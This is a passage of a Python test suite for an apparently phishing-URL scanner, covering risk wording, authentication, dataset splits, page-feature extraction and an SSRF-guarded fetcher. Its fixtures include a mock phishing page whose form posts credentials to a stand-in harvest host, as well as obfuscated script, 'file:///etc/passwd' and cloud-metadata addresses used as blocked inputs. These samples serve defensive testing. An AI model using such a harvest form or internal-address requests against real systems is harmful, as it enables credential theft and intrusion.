        b = joblib.load(MODEL_PATH)
        saved, _ = self._blocked()
        try:
            X = pd.DataFrame([extract_features(u) for u in self.URLS],
                             columns=b["feature_names"])
            for m in b["models"].values():
                m.predict_proba(X)
        finally:
            self._restore(saved)


# ------------------------------------------------- conservative assessment
class TestAssessmentLayer(unittest.TestCase):
    """The frontend may only state what the backend measured.

    These tests encode the "do not overstate" rule as something a build can
    fail on, rather than a style guideline nobody rechecks.
    """

    @classmethod
    def setUpClass(cls):
        import assessment
        cls.A = assessment

    def _feats(self, url):
        return extract_features(url)

    def test_risk_bands_match_the_specified_ranges(self):
        for score, expected in [(0, "LOW RISK"), (30, "LOW RISK"),
                                (31, "SUSPICIOUS"), (70, "SUSPICIOUS"),
                                (71, "HIGH RISK"), (100, "HIGH RISK")]:
            self.assertEqual(self.A.band_for(score)["label"], expected, score)

    def test_band_descriptions_never_claim_certainty(self):
        """No band may assert the site IS malicious or IS safe."""
        banned = ["definitely", "confirmed", "guarantee", "100%", "is malicious",
                  "is safe", "proven", "certainly"]
        for t in [t for *_, t in self.A.RISK_BANDS]:
            low = t.lower()
            for b in banned:
                self.assertNotIn(b, low, f"band text overstates: {t!r}")

    def test_disclaimer_explicitly_disclaims(self):
        """The disclaimer may say 'guarantee' only to negate it."""
        d = self.A.ASSESSMENT_DISCLAIMER.lower()
        self.assertIn("not a guarantee", d)
        for b in ("definitely", "confirmed", "proven"):
            self.assertNotIn(b, d)

    def test_low_risk_is_not_called_safe(self):
        low = [t for lo, hi, lab, key, t in self.A.RISK_BANDS if key == "low"][0]
        self.assertNotIn("safe", low.lower())
        self.assertIn("no significant suspicious characteristics", low.lower())

    def test_score_and_confidence_never_read_as_certainty(self):
        """A tree ensemble is never certain; the UI must never imply it is."""
        for p in (0.0001, 0.5, 0.9999, 0.999999):
            out = self.A.assess("http://x.com/a", p, 0.7, self._feats("http://x.com/a"))
            self.assertLess(out["risk_score"], 100, f"score hit 100 at p={p}")
            self.assertGreater(out["risk_score"], 0, f"score hit 0 at p={p}")
            self.assertLess(out["confidence"], 100.0, f"confidence hit 100 at p={p}")
            self.assertGreater(out["confidence"], 0.0)

    def test_confidence_is_low_near_the_threshold(self):
        """A borderline URL must not be presented as a confident call."""
        near = self.A.assess("http://x.com", 0.69, 0.7, self._feats("http://x.com"))
        far = self.A.assess("http://x.com", 0.999, 0.7, self._feats("http://x.com"))
        self.assertLess(near["confidence"], 20.0)
        self.assertGreater(far["confidence"], 90.0)
        self.assertEqual(near["confidence_label"], "Borderline")
        self.assertEqual(far["confidence_label"], "Decisive")

    def test_external_fields_are_unavailable_not_invented(self):
        """DNS, IP, domain age and reputation are never guessed."""
        out = self.A.assess("https://example.com/a", 0.1, 0.7,
                            self._feats("https://example.com/a"))
        d = out["domain"]
        for key in ("dns_resolution", "ip_address", "domain_age", "reputation",
                    "dns_classification"):
            self.assertFalse(d[key]["available"], f"{key} claims to be available")
            self.assertIsNone(d[key]["value"], f"{key} has an invented value")
            self.assertTrue(d[key]["reason"], f"{key} gives no reason")
        # ...while the lexically-derived ones ARE real
        self.assertTrue(d["hostname"]["available"])
        self.assertEqual(d["hostname"]["value"], "example.com")
        self.assertEqual(d["registered_domain"]["value"], "example.com")

    def test_signals_only_warn_when_the_corpus_supports_it(self):
        """A measurement with no phishing association must not be a warning.

        Measured on this corpus, long URLs (lift 0.95) and many hyphens
        (lift 0.05) are NOT more common among phishing samples. Listing them
        as warnings would manufacture evidence.
        """
        if not self.A._THRESHOLDS.get("features"):
            raise unittest.SkipTest("run src/build_signal_thresholds.py first")
        long_url = "http://" + "a" * 60 + ".com/" + "b" * 400
        sig = self.A.signals(self._feats(long_url))
        warn_text = " ".join(s["text"] for s in sig["warning"])
        self.assertNotIn("Unusually long URL", warn_text)
        neutral_text = " ".join(s["text"] for s in sig["neutral"])
        self.assertIn("Unusually long URL", neutral_text)

    def test_every_warning_signal_carries_evidence(self):
        for url in ("http://secure-paypal-login.tk/verify/9231",
                    "http://1.2.3.4@evil.com:8081//x",
                    "https://en.wikipedia.org/wiki/Phishing"):
            sig = self.A.signals(self._feats(url))
            for group in ("warning", "positive", "neutral"):
                for s in sig[group]:
                    self.assertTrue(s.get("evidence"), f"{s['text']} has no evidence")
                    self.assertNotIn("proof", s["evidence"].lower())

    def test_signals_never_use_proof_language(self):
        banned = ["proof", "confirmed", "definitely", "guaranteed"]
        for url in ("http://secure-paypal-login.tk/verify/9231",
                    "http://xn--80ak6aa92e.com/login"):
            sig = self.A.signals(self._feats(url))
            for group in sig.values():
                for s in group:
                    blob = (s["text"] + " " + s["evidence"]).lower()
                    for b in banned:
                        self.assertNotIn(b, blob, f"overstated: {s['text']}")

    def test_characteristics_are_observations_without_verdicts(self):
        chars = self.A.characteristics(self._feats("http://a-b.example.com/x?y=1"))
        self.assertGreaterEqual(len(chars), 10)
        for c in chars:
            self.assertIn("label", c)
            self.assertIn("value", c)
            blob = f"{c['label']} {c['value']}".lower()
            for word in ("malicious", "phishing", "dangerous", "attack"):
                self.assertNotIn(word, blob, f"characteristic editorialises: {c}")

    def test_explanation_is_unavailable_rather_than_fabricated(self):
        """With no model to ask, the system says so instead of inventing a cause."""
        out = self.A.assess("http://x.com/a", 0.9, 0.7, self._feats("http://x.com/a"),
                            model=None, row=None, feature_names=None)
        self.assertFalse(out["explanation"]["available"])
        self.assertIn("not available", out["explanation_text"].lower())

    def test_explanation_uses_real_model_attribution(self):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models/url_models.joblib missing")
        import joblib
        b = joblib.load(MODEL_PATH)
        m = b["models"]["XGBoost"]
        url = "http://secure-paypal-login.tk/verify/9231"
        feats = self._feats(url)
        row = pd.DataFrame([feats], columns=b["feature_names"])
        out = self.A.assess(url, float(m.predict_proba(row)[0, 1]), 0.7, feats,
                            model=m, row=row, feature_names=b["feature_names"])
        ex = out["explanation"]
        self.assertTrue(ex["available"])
        self.assertTrue(ex["contributions"])
        for c in ex["contributions"]:
            self.assertIn(c["feature"], b["feature_names"])
            self.assertIn(c["direction"], ("increases", "decreases"))
        # the attribution must reconstruct the model's own score
        import numpy as _np
        total = ex["baseline"] + sum(c["contribution"] for c in ex["contributions"])
        self.assertTrue(_np.isfinite(total))

    def test_hostname_scope_states_its_limitation(self):
        out = self.A.assess("secure-paypal-login.tk", 0.8, 0.65,
                            self._feats("secure-paypal-login.tk"), dns_only=True)
        self.assertEqual(out["scope"], "hostname")
        self.assertIn("Only the hostname was available",
                      out["domain"]["scope_note"])
        self.assertIn("less accurate", out["scope_warning"])


# -------------------------------------------------- new API surface
class TestAssessmentAPI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models/url_models.joblib missing")
        import app as flask_app
        cls.mod = flask_app
        flask_app.app.config["TESTING"] = True
        cls.client = flask_app.app.test_client()

    def test_scan_preserves_the_original_contract(self):
        """The Chrome extension and the old tests must keep working."""
        d = json.loads(self.client.post("/api/scan", json={"url": PHISHY}).data)
        for k in ("url", "consensus", "votes_malicious", "total_models",
                  "models", "best_model_name", "top_features", "threshold"):
            self.assertIn(k, d, f"removed existing field {k}")

    def test_scan_adds_the_assessment_block(self):
        d = json.loads(self.client.post("/api/scan", json={"url": PHISHY}).data)
        a = d["assessment"]
        for k in ("risk_score", "risk_band", "confidence", "disclaimer",
                  "characteristics", "signals", "explanation", "domain"):
            self.assertIn(k, a)
        self.assertTrue(0 < a["risk_score"] < 100)
        self.assertIsInstance(d["detection_ms"], float)
        self.assertGreater(d["detection_ms"], 0)
        self.assertIn("not a guarantee", a["disclaimer"].lower())

    def test_non_web_schemes_are_refused_not_scored(self):
        """Scoring javascript:/mailto: would answer a question the model cannot."""
        for bad in ("javascript:alert(1)", "mailto:a@b.com", "ftp://x.com/y",
                    "file:///etc/passwd"):
            r = self.client.post("/api/scan", json={"url": bad})
            self.assertEqual(r.status_code, 400, bad)
            self.assertIn("error", json.loads(r.data))

    def test_host_port_urls_are_still_accepted(self):
        for ok in ("example.com:8080/x", "http://1.2.3.4:31337/x", "localhost:5000"):
            r = self.client.post("/api/scan", json={"url": ok})
            self.assertEqual(r.status_code, 200, ok)

    def test_garbage_input_is_refused(self):
        for bad in ("not a url", "   ", ""):
            r = self.client.post("/api/scan", json={"url": bad})
            self.assertEqual(r.status_code, 400, repr(bad))

    def test_stats_report_insufficient_data_when_empty(self):
        """No sample numbers: an empty install must say so."""
        self.client.delete("/api/history")
        s = json.loads(self.client.get("/api/stats").data)
        self.assertFalse(s["sufficient_data"])
        self.assertEqual(s["total"], 0)
        self.assertIsNone(s["avg_detection_ms"])

    def test_stats_count_only_real_scans(self):
        self.client.delete("/api/history")
        self.client.post("/api/scan", json={"url": BENIGN})
        self.client.post("/api/scan", json={"url": PHISHY})
        s = json.loads(self.client.get("/api/stats").data)
        self.assertEqual(s["total"], 2)
        self.assertEqual(s["low"] + s["suspicious"] + s["high"], 2)
        self.assertIsNotNone(s["avg_detection_ms"])

    def test_history_records_what_was_scanned(self):
        self.client.delete("/api/history")
        self.client.post("/api/scan", json={"url": PHISHY})
        h = json.loads(self.client.get("/api/history").data)
        self.assertEqual(h["total"], 1)
        it = h["items"][0]
        for k in ("id", "url", "risk_score", "risk_band", "risk_key",
                  "scanned_at", "detection_ms", "source"):
            self.assertIn(k, it)
        detail = json.loads(self.client.get(f"/api/history/{it['id']}").data)
        self.assertEqual(detail["id"], it["id"])

    def test_hostname_scope_uses_the_hostname_model(self):
        r = self.client.post("/api/scan",
                             json={"url": PHISHY, "scope": "hostname"})
        if r.status_code == 503:
            raise unittest.SkipTest("hostname model not trained")
        d = json.loads(r.data)
        self.assertEqual(d["scope"], "hostname")
        self.assertEqual(d["subject"], "secure-paypal-login.tk")
        self.assertIn("less accurate", d["assessment"]["scope_warning"])

    def test_meta_describes_the_system_without_overstating(self):
        m = json.loads(self.client.get("/api/meta").data)
        self.assertEqual(len(m["bands"]), 3)
        self.assertIn("not a guarantee", m["disclaimer"].lower())
        # The blanket "never contacts the URL" claim was replaced by a precise
        # one once the website layer was added: URL analysis still never
        # contacts the address, website analysis deliberately does, and it is
        # opt-in. Advertising the old flag would now be a false claim.
        self.assertNotIn("never_contacts_url", m)
        self.assertTrue(m["url_analysis_never_contacts_url"])
        self.assertTrue(m["website_analysis_contacts_url"])
        self.assertFalse(m["website_analysis_default"])


# ================================================ dataset pipeline (Part 1-2)
class TestDatasetPipeline(unittest.TestCase):
    DATA = os.path.join(ROOT, "data", "urlguard_dataset.csv")
    MANIFEST = os.path.join(ROOT, "data", "dataset_manifest.json")

    @classmethod
    def setUpClass(cls):
        if not os.path.exists(cls.DATA):
            raise unittest.SkipTest("run src/build_dataset.py first")
        cls.df = pd.read_csv(cls.DATA)
        with open(cls.MANIFEST, encoding="utf-8") as fh:
            cls.manifest = json.load(fh)

    def test_schema_and_provenance(self):
        for col in ("url", "label", "source", "label_confidence", "first_seen",
                    "collected_at", "registered_domain", "split", "temporal_split"):
            self.assertIn(col, self.df.columns)
        self.assertTrue(self.df["source"].notna().all(), "a row has no source")
        self.assertTrue(self.df["collected_at"].notna().all(),
                        "a row has no collection date")

    def test_every_source_declares_a_licence(self):
        import sys as _s
        _s.path.insert(0, os.path.join(ROOT, "src"))
        from datasets.sources import SOURCES
        for s in SOURCES:
            self.assertTrue(s.licence, f"{s.key} has no licence")
            self.assertTrue(s.attribution, f"{s.key} has no attribution")
            self.assertIn(s.label_confidence, ("verified", "reported", "presumed"))

    def test_tranco_is_never_called_verified_benign(self):
        """Popularity is not a safety judgement."""
        import sys as _s
        _s.path.insert(0, os.path.join(ROOT, "src"))
        from datasets.sources import BY_KEY
        self.assertEqual(BY_KEY["tranco"].label_confidence, "presumed")
        tr = self.df[self.df.source == "tranco"]
        if len(tr):
            self.assertTrue((tr.label_confidence == "presumed").all())

    def test_no_canonical_duplicates_remain(self):
        from leakage import canonicalize
        self.assertFalse(self.df["url"].map(canonicalize).duplicated().any())

    def test_splits_share_no_registered_domain(self):
        g = self.df["registered_domain"]
        tr = set(g[self.df.split == "train"])
        va = set(g[self.df.split == "val"])
        ho = set(g[self.df.split == "holdout"])
        self.assertEqual(tr & va, set(), "train/val share domains")
        self.assertEqual(tr & ho, set(), "train/holdout share domains")
        self.assertEqual(va & ho, set(), "val/holdout share domains")

    def test_temporal_split_is_domain_disjoint(self):
        t = self.df[self.df.temporal_split == "train"]
        s = self.df[self.df.temporal_split == "test"]
        if len(t) and len(s):
            self.assertEqual(
                set(t.registered_domain) & set(s.registered_domain), set(),
                "a domain straddles the temporal cut-off")

    def test_temporal_asymmetry_is_declared(self):
        """Only malicious rows are dated; the manifest must say so."""
        temporal = self.manifest["counts"].get("temporal", {})
        if temporal.get("available") is False:
            raise unittest.SkipTest("temporal split unavailable")
        self.assertIn("caveat", temporal)
        self.assertEqual(temporal.get("time_ordered_side"), "malicious only")

    def test_structural_confound_is_measured_and_bounded(self):
        """URL shape must not stand in for the label."""
        final = self.manifest["counts"].get("structural_confound_auc_final") \
            or self.manifest["counts"].get("structural_confound_auc")
        self.assertTrue(final, "no structural confound measurement recorded")
        worst = max(final.values())
        self.assertLess(worst, 0.80,
                        f"a single structural property separates the classes "
                        f"at AUC {worst}: {final}")

    def test_scheme_cannot_predict_the_label(self):
        https = self.df["url"].str.startswith("https://")
        rate0 = https[self.df.label == 0].mean()
        rate1 = https[self.df.label == 1].mean()
        self.assertLess(abs(rate0 - rate1), 0.05,
                        f"https rate differs by class ({rate0:.3f} vs {rate1:.3f}); "
                        f"scheme would act as a label shortcut")

    def test_manifest_records_leakage_controls(self):
        self.assertIn("leakage_controls", self.manifest)
        self.assertGreaterEqual(len(self.manifest["leakage_controls"]), 4)
        self.assertTrue(self.manifest.get("dataset_version"))
        self.assertTrue(self.manifest.get("sha256"))


# ============================================== model + versioning (4,5,20)
class TestModelV3(unittest.TestCase):
    MD = os.path.join(ROOT, "models", "v3")

    @classmethod
    def setUpClass(cls):
        p = os.path.join(cls.MD, "url_models.joblib")
        if not os.path.exists(p):
            raise unittest.SkipTest("run src/train_v3.py first")
        import joblib
        cls.b = joblib.load(p)

    def test_bundle_carries_versions(self):
        self.assertTrue(self.b["model_version"].startswith("URLGuard-"))
        self.assertTrue(self.b["dataset_version"].startswith("URLGuard-MultiSource"))
        self.assertEqual(len(self.b["feature_names"]), len(FEATURE_NAMES))

    def test_all_five_algorithms_were_compared(self):
        comp = pd.read_csv(os.path.join(self.MD, "model_comparison.csv"))
        self.assertGreaterEqual(len(comp), 5)
        for col in ("ROC-AUC", "PR-AUC", "FPR", "FNR", "Precision", "Recall",
                    "F1-Score", "Accuracy", "single_url_ms"):
            self.assertIn(col, comp.columns, f"metric {col} not reported")

    def test_selection_was_not_accuracy_alone(self):
        sel = pd.read_csv(os.path.join(self.MD, "selection.csv"))
        self.assertIn("meets_ceiling", sel.columns)
        self.assertIn("val_fpr_at_thr", sel.columns)
        self.assertIn("ms", sel.columns)

    def test_holdout_was_scored_and_recorded(self):
        ho = self.b["holdout"]
        for k in ("ROC-AUC", "PR-AUC", "FPR", "FNR", "TN", "FP", "FN", "TP"):
            self.assertIn(k, ho)
        self.assertTrue(0 < ho["ROC-AUC"] <= 1)

    def test_inference_cost_is_measured(self):
        inf = self.b["inference"]
        self.assertGreater(inf["single_url_ms"], 0)
        self.assertIn("throughput_per_s", inf)

    def test_temporal_results_recorded_or_explained(self):
        t = self.b["temporal"]
        if t.get("available"):
            self.assertIn("results", t)
            self.assertIn("cutoff", t)
        else:
            self.assertIn("reason", t)


# ============================================== auth + API (Parts 8, 17, 19)
class TestAuthAPI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models missing")
        import app as flask_app
        cls.app = flask_app
        flask_app.app.config["TESTING"] = True
        flask_app.app.config["EXPOSE_RESET_TOKEN"] = True
        cls.client = flask_app.app.test_client()
        cls.uniq = 0

    def setUp(self):
        # The rate limiter is real and shared process-wide, so a suite that
        # registers a dozen accounts trips it. Counters are reset per test;
        # test_rate_limiting_exists_on_login still proves it fires, because it
        # makes all of its attempts inside a single test.
        with self.app._RATE_LOCK:
            self.app._RATE.clear()

    def _email(self):
        TestAuthAPI.uniq += 1
        return f"t{TestAuthAPI.uniq}_{int(time.time()*1000)}@example.com"

    def _register(self, pw="correct-horse-7"):
        e = self._email()
        r = self.client.post("/api/auth/register", json={
            "name": "Test User", "email": e, "password": pw,
            "confirm_password": pw})
        self.assertEqual(r.status_code, 201, r.data)
        return e, pw, json.loads(r.data)

    # ---- registration -----------------------------------------------------
    def test_registration_returns_tokens_and_user(self):
        _e, _p, d = self._register()
        self.assertIn("access_token", d)
        self.assertIn("refresh_token", d)
        self.assertNotIn("password", json.dumps(d).lower().replace('"password"', ''))

    def test_password_is_never_stored_in_plaintext(self):
        e, pw, _ = self._register()
        import auth as A
        row = A.get_user_by_email(e)
        self.assertNotIn(pw, row["password_hash"])
        self.assertTrue(row["password_hash"].startswith("$argon2"),
                        "password is not Argon2-hashed")

    def test_short_and_mismatched_passwords_rejected(self):
        r = self.client.post("/api/auth/register", json={
            "name": "x", "email": self._email(), "password": "short",
            "confirm_password": "short"})
        self.assertEqual(r.status_code, 400)
        r = self.client.post("/api/auth/register", json={
            "name": "x", "email": self._email(), "password": "correct-horse-7",
            "confirm_password": "different-horse"})
        self.assertEqual(r.status_code, 400)

    def test_duplicate_email_does_not_confirm_existence(self):
        e, pw, _ = self._register()
        r = self.client.post("/api/auth/register", json={
            "name": "x", "email": e, "password": pw, "confirm_password": pw})
        self.assertEqual(r.status_code, 409)
        body = json.loads(r.data)["error"].lower()
        self.assertNotIn("already", body)
        self.assertNotIn("exists", body)

    # ---- login ------------------------------------------------------------
    def test_login_and_wrong_password_are_indistinguishable_in_wording(self):
        e, pw, _ = self._register()
        ok = self.client.post("/api/auth/login", json={"email": e, "password": pw})
        self.assertEqual(ok.status_code, 200)
        bad = self.client.post("/api/auth/login",
                               json={"email": e, "password": "wrong-pass-123"})
        missing = self.client.post("/api/auth/login",
                                   json={"email": self._email(),
                                         "password": "wrong-pass-123"})
        self.assertEqual(bad.status_code, 401)
        self.assertEqual(missing.status_code, 401)
        self.assertEqual(json.loads(bad.data)["error"],
                         json.loads(missing.data)["error"])

    # ---- authorisation ----------------------------------------------------
    def test_protected_routes_reject_anonymous_and_bad_tokens(self):
        for hdrs in ({}, {"Authorization": "Bearer not-a-token"},
                     {"Authorization": "Bearer "}):
            r = self.client.get("/api/auth/me", headers=hdrs)
            self.assertEqual(r.status_code, 401, hdrs)

    def test_one_user_cannot_read_another_users_scan(self):
        _e1, _p1, u1 = self._register()
        _e2, _p2, u2 = self._register()
        h1 = {"Authorization": f"Bearer {u1['access_token']}"}
        h2 = {"Authorization": f"Bearer {u2['access_token']}"}
        d = json.loads(self.client.post("/api/scan", json={"url": PHISHY},
                                        headers=h1).data)
        sid = d["scan_id"]
        # owner can read it
        self.assertEqual(self.client.get(f"/api/history/{sid}",
                                         headers=h1).status_code, 200)
        # another account gets 404, not 403: no existence oracle
        other = self.client.get(f"/api/history/{sid}", headers=h2)
        self.assertEqual(other.status_code, 404)
        # and it does not appear in their listing
        lst = json.loads(self.client.get("/api/history", headers=h2).data)
        self.assertNotIn(sid, [i["id"] for i in lst["items"]])

    def test_history_is_scoped_per_user(self):
        _e1, _p1, u1 = self._register()
        _e2, _p2, u2 = self._register()
        h1 = {"Authorization": f"Bearer {u1['access_token']}"}
        h2 = {"Authorization": f"Bearer {u2['access_token']}"}
        self.client.post("/api/scan", json={"url": PHISHY}, headers=h1)
        self.client.post("/api/scan", json={"url": BENIGN}, headers=h2)
        a = json.loads(self.client.get("/api/history", headers=h1).data)
        b = json.loads(self.client.get("/api/history", headers=h2).data)
        self.assertEqual(a["total"], 1)
        self.assertEqual(b["total"], 1)
        self.assertNotEqual(a["items"][0]["url"], b["items"][0]["url"])

    # ---- tokens -----------------------------------------------------------
    def test_refresh_rotates_and_burns_the_old_token(self):
        _e, _p, d = self._register()
        rt = d["refresh_token"]
        r1 = self.client.post("/api/auth/refresh", json={"refresh_token": rt})
        self.assertEqual(r1.status_code, 200)
        # the presented token must not work twice
        r2 = self.client.post("/api/auth/refresh", json={"refresh_token": rt})
        self.assertEqual(r2.status_code, 401)

    def test_logout_revokes_the_refresh_token(self):
        _e, _p, d = self._register()
        self.client.post("/api/auth/logout",
                         json={"refresh_token": d["refresh_token"]})
        r = self.client.post("/api/auth/refresh",
                             json={"refresh_token": d["refresh_token"]})
        self.assertEqual(r.status_code, 401)

    def test_password_change_invalidates_existing_sessions(self):
        e, pw, d = self._register()
        h = {"Authorization": f"Bearer {d['access_token']}"}
        r = self.client.post("/api/auth/password", headers=h, json={
            "current_password": pw, "new_password": "brand-new-pass-9"})
        self.assertEqual(r.status_code, 200)
        self.assertEqual(self.client.post(
            "/api/auth/refresh",
            json={"refresh_token": d["refresh_token"]}).status_code, 401)

    def test_forgot_password_does_not_reveal_account_existence(self):
        e, _pw, _d = self._register()
        known = self.client.post("/api/auth/forgot", json={"email": e})
        unknown = self.client.post("/api/auth/forgot",
                                   json={"email": self._email()})
        self.assertEqual(known.status_code, unknown.status_code)
        self.assertEqual(json.loads(known.data)["message"],
                         json.loads(unknown.data)["message"])

    def test_password_reset_token_works_once(self):
        e, _pw, _d = self._register()
        tok = json.loads(self.client.post(
            "/api/auth/forgot", json={"email": e}).data).get("reset_token")
        self.assertTrue(tok, "test config should expose the reset token")
        ok = self.client.post("/api/auth/reset",
                              json={"token": tok, "new_password": "fresh-pass-42"})
        self.assertEqual(ok.status_code, 200)
        again = self.client.post("/api/auth/reset",
                                 json={"token": tok, "new_password": "other-pass-42"})
        self.assertEqual(again.status_code, 400)

    def test_profile_update_and_preferences(self):
        _e, _p, d = self._register()
        h = {"Authorization": f"Bearer {d['access_token']}"}
        r = self.client.patch("/api/auth/profile", headers=h, json={
            "name": "Renamed", "preferences": {"dns_layer_enabled": True}})
        self.assertEqual(r.status_code, 200)
        u = json.loads(r.data)["user"]
        self.assertEqual(u["name"], "Renamed")
        self.assertTrue(u["preferences"]["dns_layer_enabled"])

    # ---- scans ------------------------------------------------------------
    def test_scan_response_carries_model_version(self):
        _e, _p, d = self._register()
        h = {"Authorization": f"Bearer {d['access_token']}"}
        s = json.loads(self.client.post("/api/scan", json={"url": PHISHY},
                                        headers=h).data)
        self.assertTrue(s["model_version"])
        self.assertTrue(s["dataset_version"])
        self.assertIn("assessment", s)

    def test_anonymous_scanning_still_works(self):
        """The browser extension has no account and must keep working."""
        r = self.client.post("/api/scan", json={"url": PHISHY})
        self.assertEqual(r.status_code, 200)
        c = self.client.get("/api/check", query_string={"url": PHISHY})
        self.assertEqual(c.status_code, 200)

    def test_analytics_are_scoped_and_honest_when_empty(self):
        _e, _p, d = self._register()
        h = {"Authorization": f"Bearer {d['access_token']}"}
        a = json.loads(self.client.get("/api/analytics", headers=h).data)
        self.assertFalse(a["sufficient_data"])
        self.assertEqual(a["total"], 0)
        self.assertIsNone(a["avg_detection_ms"])

    def test_rate_limiting_exists_on_login(self):
        e = self._email()
        codes = [self.client.post("/api/auth/login",
                                  json={"email": e, "password": "nope-nope-nope"}
                                  ).status_code for _ in range(14)]
        self.assertIn(429, codes, "login is not rate limited")


# ==================================================== website analysis layer
LEGIT_PAGE = """<!doctype html><html><head><title>Example Domain</title>
<link rel="icon" href="/favicon.ico"></head><body><h1>Example Domain</h1>
<p>This domain is for use in illustrative examples in documents.</p>
<a href="/about">About</a><a href="/contact">Contact</a>
<a href="https://www.iana.org/domains/example">More information</a>
</body></html>"""

LOGIN_PAGE = """<!doctype html><html><head><title>Sign in - Acme Intranet</title>
</head><body><form action="/session" method="post">
<input type="email" name="email"><input type="password" name="password">
<button>Sign in</button></form></body></html>"""

PHISH_PAGE = """<!doctype html><html><head><title>PayPal - Log In</title></head>
<body><h1>Sign in to your PayPal account</h1>
<p>Your account has been suspended. Verify now within 24 hours or it will be closed.</p>
<form action="https://collector-evil.ru/harvest.php" method="post">
<input type="email" name="email"><input type="password" name="pass">
<input type="hidden" name="a" value="1"><input type="hidden" name="b" value="2">
<input name="card" placeholder="Card number"><button>Log In</button></form>
<iframe src="//t.example.net/x" width="0" height="0"></iframe>
<div style="display:none">x</div>
<script src="https://cdn.other.cc/a.js"></script>
<script>eval(unescape("%41"));document.write("y");String.fromCharCode(65)</script>
</body></html>"""

BRAND_IMPERSONATION = """<!doctype html><html><head><title>Apple ID - Sign In</title>
</head><body><h1>Sign in with your Apple ID</h1>
<form action="/go" method="post"><input name="appleid" type="email">
<input type="password" name="pw"><button>Continue</button></form></body></html>"""

MALFORMED_PAGES = [
    "", "   ", "<html", "<<<>>>", "<html><body><form action=",
    "not html at all, just text", "<html>" + "<div>" * 300,
    "<html><body>" + "x" * 50_000 + "</body></html>",
    "<html><head><title></title></head><body><form><input type=password>",
    "\x00\x01\x02<html><body>binary</body></html>",
    "<html><body><a href='::::'>bad</a><iframe src='javascript:x'></iframe>",
]


class TestWebFeatures(unittest.TestCase):
    """Page features are measurements. Each case asserts what is MEASURED,
    never that the page 'is' phishing."""

    @classmethod
    def setUpClass(cls):
        from web_features import extract_web_features, WEB_FEATURE_NAMES, FEATURE_GROUPS
        cls.extract = staticmethod(extract_web_features)
        cls.NAMES = WEB_FEATURE_NAMES
        cls.GROUPS = FEATURE_GROUPS

    def test_feature_set_is_complete_and_grouped(self):
        self.assertGreaterEqual(len(self.NAMES), 60)
        grouped = {n for v in self.GROUPS.values() for n in v}
        self.assertEqual(set(self.NAMES), grouped,
                         "every feature must belong to exactly one group")

    def test_legitimate_page_raises_no_credential_signals(self):
        f = self.extract(LEGIT_PAGE, "https://example.com/")
        self.assertEqual(f["num_password_fields"], 0)
        self.assertEqual(f["is_login_page"], 0)
        self.assertEqual(f["has_credential_pair"], 0)
        self.assertEqual(f["brand_domain_mismatch"], 0)
        self.assertEqual(f["password_form_posts_offsite"], 0)
        self.assertEqual(f["page_is_https"], 1)

    def test_ordinary_login_page_is_detected_without_being_condemned(self):
        """A real login page must register as a login page and nothing worse."""
        f = self.extract(LOGIN_PAGE, "https://intranet.acme-corp.com/login")
        self.assertEqual(f["is_login_page"], 1)
        self.assertEqual(f["has_credential_pair"], 1)
        # ...but it posts to itself and claims no brand
        self.assertEqual(f["password_form_posts_offsite"], 0)
        self.assertEqual(f["any_form_offsite"], 0)
        self.assertEqual(f["brand_domain_mismatch"], 0)

    def test_phishing_page_patterns_are_measured(self):
        f = self.extract(PHISH_PAGE, "http://paypal-secure-verify.tk/login",
                         {"tls_verified": False, "status": 200,
                          "redirect_count": 0, "bytes": len(PHISH_PAGE),
                          "final_url": "http://paypal-secure-verify.tk/login",
                          "requested_url": "http://paypal-secure-verify.tk/login"})
        self.assertEqual(f["password_form_posts_offsite"], 1)
        self.assertEqual(f["any_form_offsite"], 1)
        self.assertEqual(f["has_credential_pair"], 1)
        self.assertGreaterEqual(f["num_sensitive_fields"], 1)
        self.assertGreaterEqual(f["num_zero_size_iframes"], 1)
        self.assertGreaterEqual(f["obfuscation_signal_count"], 2)
        self.assertGreaterEqual(f["urgency_terms"], 2)
        self.assertGreaterEqual(f["num_external_scripts"], 1)

    def test_brand_impersonation_uses_official_domains_not_substrings(self):
        """paypal-secure-verify.tk contains 'paypal' and is not PayPal."""
        imp = self.extract(BRAND_IMPERSONATION, "http://appleid-verify.cf/signin")
        self.assertEqual(imp["brand_domain_mismatch"], 1)
        self.assertEqual(imp["brand_on_official_domain"], 0)

        real = self.extract(BRAND_IMPERSONATION, "https://appleid.apple.com/signin")
        self.assertEqual(real["brand_domain_mismatch"], 0)
        self.assertEqual(real["brand_on_official_domain"], 1)

        lookalike = self.extract(
            '<html><head><title>PayPal</title></head><body>PayPal</body></html>',
            "http://paypal-secure-verify.tk/")
        self.assertEqual(lookalike["brand_lookalike_domain"], 1,
                         "brand name inside a non-brand domain must be flagged")
        self.assertEqual(lookalike["brand_domain_mismatch"], 1)

    def test_malformed_pages_never_raise_and_stay_finite(self):
        import math as _m
        for page in MALFORMED_PAGES:
            for url in ("http://x.com/", "", "http://[", "not a url"):
                f = self.extract(page, url)
                self.assertEqual(len(f), len(self.NAMES), repr(page[:25]))
                for k, v in f.items():
                    self.assertIsInstance(v, (int, float), f"{k} on {page[:20]!r}")
                    self.assertTrue(_m.isfinite(v), f"{k} on {page[:20]!r}")

    def test_extraction_is_deterministic(self):
        a = self.extract(PHISH_PAGE, "http://x.tk/a")
        b = self.extract(PHISH_PAGE, "http://x.tk/a")
        self.assertEqual(a, b)


class TestWebFetchSandbox(unittest.TestCase):
    """The fetcher takes an untrusted URL. These are the guards that stop it
    becoming an SSRF tool, and they are asserted, not assumed."""

    @classmethod
    def setUpClass(cls):
        from web_fetch import fetch, FetchError, _is_blocked_ip, _is_ip_literal
        cls.fetch = staticmethod(fetch)
        cls.FetchError = FetchError
        cls._blocked = staticmethod(_is_blocked_ip)
        cls._literal = staticmethod(_is_ip_literal)

    def test_internal_addresses_are_refused(self):
        for url in ("http://127.0.0.1:5000/api/meta", "http://localhost/",
                    "http://169.254.169.254/latest/meta-data/",
                    "http://10.0.0.1/", "http://192.168.1.1/",
                    "http://172.16.0.1/", "http://[::1]/", "http://0.0.0.0/"):
            with self.assertRaises(self.FetchError, msg=url) as ctx:
                self.fetch(url)
            self.assertEqual(ctx.exception.code, "blocked_address", url)

    def test_non_http_schemes_are_refused(self):
        for url in ("file:///etc/passwd", "ftp://ftp.example.com/",
                    "gopher://x/", "data:text/html,<b>x"):
            with self.assertRaises(self.FetchError, msg=url):
                self.fetch(url)

    def test_address_classification(self):
